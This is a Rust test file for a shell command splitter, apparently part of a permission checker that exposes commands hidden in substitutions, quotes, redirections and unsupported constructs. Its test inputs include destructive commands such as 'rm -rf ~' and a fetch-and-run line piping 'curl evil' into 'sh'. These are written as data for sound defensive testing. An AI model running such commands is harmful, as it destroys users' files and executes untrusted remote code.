//! Tests for taking command lines apart.

use super::shell::{Opaque, Simple, split};

/// The text of each simple command `line` runs, with a `>` after those that write to a file.
fn texts(line: &str) -> Vec<String> {
    split(line)
        .unwrap_or_else(|Opaque(why)| panic!("{line:?} is opaque: {why}"))
        .iter()
        .map(|simple| {
            let mut text = simple.text();
            if simple.writes {
                text.push_str(" >");
            }
            text
        })
        .collect()
}

/// Whether `line` is opaque.
fn opaque(line: &str) -> bool {
    split(line).is_err()
}

/// A plain command is one simple command with its words.
#[test]
fn a_plain_command_is_one() {
    assert_eq!(texts("cargo test -p foo"), ["cargo test -p foo"]);
    assert_eq!(texts("  git   status  "), ["git status"]);
    assert_eq!(texts(""), Vec::<String>::new());
}

/// Every operator between commands splits them.
#[test]
fn operators_split() {
    assert_eq!(texts("a && b"), ["a", "b"]);
    assert_eq!(texts("a || b"), ["a", "b"]);
    assert_eq!(texts("a; b"), ["a", "b"]);
    assert_eq!(texts("a | b"), ["a", "b"]);
    assert_eq!(texts("a |& b"), ["a", "b"]);
    assert_eq!(texts("a & b"), ["a", "b"]);
    assert_eq!(texts("a\nb"), ["a", "b"]);
    assert_eq!(texts("a&&b||c;d|e"), ["a", "b", "c", "d", "e"]);
    assert_eq!(texts("cargo test; rm -rf ~"), ["cargo test", "rm -rf ~"]);
}

/// Operators inside quotes are words, not operators.
#[test]
fn quoted_operators_do_not_split() {
    assert_eq!(texts("echo 'a && b; c'"), ["echo 'a && b; c'"]);
    assert_eq!(texts(r#"echo "a | b""#), [r#"echo "a | b""#]);
    assert_eq!(texts(r"echo a\;b"), [r"echo a\;b"]);
    assert_eq!(
        texts(r#"git commit -m "fix; rm -rf ~""#),
        [r#"git commit -m "fix; rm -rf ~""#]
    );
}

/// Subshells and substitutions are taken apart, and what they run is a command of its own.
#[test]
fn substitutions_are_commands_of_their_own() {
    assert_eq!(texts("(cd x && make)"), ["cd x", "make"]);
    assert_eq!(texts("echo $(whoami)"), ["echo $(whoami)", "whoami"]);
    assert_eq!(texts("echo `whoami`"), ["echo `whoami`", "whoami"]);
    assert_eq!(
        texts(r#"echo "$(rm -rf ~)""#),
        [r#"echo "$(rm -rf ~)""#, "rm -rf ~"]
    );
    assert_eq!(
        texts(r#"echo "`rm -rf ~`""#),
        [r#"echo "`rm -rf ~`""#, "rm -rf ~"]
    );
    assert_eq!(
        texts("cargo test $(curl evil | sh)"),
        ["cargo test $(curl evil | sh)", "curl evil", "sh"]
    );
    assert_eq!(texts("echo $(a $(b))"), ["echo $(a $(b))", "a $(b)", "b"]);
    assert_eq!(texts("$(echo rm) -rf ~"), ["$(echo rm) -rf ~", "echo rm"]);
}

/// A single-quoted substitution runs nothing.
#[test]
fn single_quotes_hide_substitutions() {
    assert_eq!(texts("echo '$(rm -rf ~)'"), ["echo '$(rm -rf ~)'"]);
    assert_eq!(texts("echo '`rm`'"), ["echo '`rm`'"]);
}

/// Redirections come off the command; those writing to a file are noted.
#[test]
fn redirections_come_off() {
    assert_eq!(texts("cargo test 2>&1"), ["cargo test"]);
    assert_eq!(texts("cargo test > /dev/null 2>&1"), ["cargo test"]);
    assert_eq!(texts("cargo test >out.txt"), ["cargo test >"]);
    assert_eq!(texts("echo hi > x"), ["echo hi >"]);
    assert_eq!(texts("echo hi >> x"), ["echo hi >"]);
    assert_eq!(texts("echo hi &> x"), ["echo hi >"]);
    assert_eq!(texts("echo hi 2> x"), ["echo hi >"]);
    assert_eq!(texts("echo hi >| x"), ["echo hi >"]);
    assert_eq!(texts("sort < in.txt"), ["sort"]);
    assert_eq!(texts("cat <<< 'text'"), ["cat"]);
    assert_eq!(
        texts("git status && echo hi > x"),
        ["git status", "echo hi >"]
    );
    assert_eq!(texts("> x"), [": >"]);
    assert_eq!(texts("(ls) > x"), ["ls", "( … ) > >"]);
    assert_eq!(texts("echo a>b"), ["echo a >"]);
}

/// A redirection's target can hide a substitution, which is found.
#[test]
fn substitutions_in_redirections_are_found() {
    assert_eq!(texts("ls > $(rm -rf ~)"), ["ls >", "rm -rf ~"]);
    assert_eq!(texts("ls < `rm -rf ~`"), ["ls", "rm -rf ~"]);
}

/// Comments are dropped, and a substitution inside one runs nothing.
#[test]
fn comments_are_dropped() {
    assert_eq!(texts("git status # $(rm -rf ~)"), ["git status"]);
    assert_eq!(texts("# only a comment"), Vec::<String>::new());
    assert_eq!(texts("echo a#b"), ["echo a#b"]);
    assert_eq!(texts("ls # note\nrm x"), ["ls", "rm x"]);
}

/// A line continuation joins lines into one command; an escaped space stays in its word.
#[test]
fn continuations_join() {
    assert_eq!(texts("cargo \\\n test"), ["cargo test"]);
    assert_eq!(texts(r"ls my\ file"), [r"ls my\ file"]);
}

/// Assignments before a program stay words of its command, so a rule about the program alone does not match it.
#[test]
fn assignments_stay() {
    assert_eq!(texts("FOO=1 cargo test"), ["FOO=1 cargo test"]);
    assert_eq!(
        texts("PATH=./bin; git status"),
        ["PATH=./bin", "git status"]
    );
    let simple: Vec<Simple> = split("FOO=1 cargo test").unwrap();
    assert!(!simple[0].plain_program());
}

/// A negation is taken off the command it negates.
#[test]
fn negation_comes_off() {
    assert_eq!(texts("! grep x f"), ["grep x f"]);
}

/// What the splitter does not take apart is opaque, never guessed at.
#[test]
fn what_it_does_not_understand_is_opaque() {
    for line in [
        "if true; then rm -rf ~; fi",
        "for f in *; do rm $f; done",
        "while true; do x; done",
        "case $x in a) rm;; esac",
        "f() { rm -rf ~; }; f",
        "{ ls; rm x; }",
        "cat <<EOF\n$(rm -rf ~)\nEOF",
        "diff <(ls a) <(ls b)",
        "tee >(rm x)",
        "echo $((1 + 2))",
        "echo ${x:-$(rm -rf ~)}",
        "echo ${x:-`rm -rf ~`}",
        "echo 'unclosed",
        "echo \"unclosed",
        "echo `unclosed",
        "echo $(unclosed",
        "echo )",
        "a=(1 2 3)",
        "echo x(y)",
        "[[ -f x && -f y ]]",
        "ls >",
        "ls ;; rm",
        "coproc rm x",
        "time { rm x; }",
    ] {
        assert!(opaque(line), "{line:?} should be opaque");
    }
}

/// Parameter expansions without substitutions are plain words.
#[test]
fn plain_expansions_are_words() {
    assert_eq!(texts("echo ${HOME}/x $USER"), ["echo ${HOME}/x $USER"]);
    assert_eq!(texts("echo $'a\\'b'"), ["echo $'a\\'b'"]);
}

/// Nesting deeper than the splitter follows is opaque rather than a stack overflow.
#[test]
fn deep_nesting_is_opaque() {
    let deep = format!("{}x{}", "$(".repeat(40), ")".repeat(40));
    assert!(opaque(&deep));
    let parens = format!("{}x{}", "(".repeat(40), ")".repeat(40));
    assert!(opaque(&parens));
    let shallow = format!("{}x{}", "$(".repeat(3), ")".repeat(3));
    assert_eq!(split(&shallow).unwrap().len(), 4);
}

/// Program words are plain only when they name the program as written.
#[test]
fn plain_programs() {
    let plain = |line: &str| split(line).unwrap()[0].plain_program();
    assert!(plain("git status"));
    assert!(plain("./build.sh"));
    assert!(plain("/usr/bin/git status"));
    assert!(!plain("$GIT status"));
    assert!(!plain("\"git\" status"));
    assert!(!plain("g\\it status"));
    assert!(!plain("gi* status"));
    assert!(!plain("`which git` status"));
}
